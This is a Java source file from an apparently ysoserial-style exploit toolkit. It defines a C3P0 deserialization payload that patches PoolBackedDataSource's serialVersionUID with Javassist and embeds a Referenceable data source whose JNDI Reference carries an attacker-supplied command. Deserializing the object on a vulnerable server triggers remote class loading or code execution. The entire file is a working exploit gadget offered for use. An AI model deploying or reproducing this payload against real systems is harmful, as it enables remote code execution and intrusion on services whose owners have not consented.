package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.JavassistClassLoader;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import cn.butler.jndi.Dispatcher;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P03_c3p0 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        // 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
        final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");

        try {
            CtField ctSUID = ctPoolBackedDataSource.getDeclaredField("serialVersionUID");
            ctPoolBackedDataSource.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctPoolBackedDataSource.addField(CtField.make("private static final long serialVersionUID = 7387108436934414104L;", ctPoolBackedDataSource));

        // mock method name until armed
        final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new JavassistClassLoader());

        Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
        Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(command));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String command;

        public PoolSource (String command) {
            this.command = command;
        }

        public Reference getReference() throws NamingException {
            Reference ref = (Reference) Dispatcher.getInstance().service(command);
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }

    public static void main ( String[] args ) throws Exception {
        PayloadRunner.run(C3P03_c3p0.class, args);
    }
}
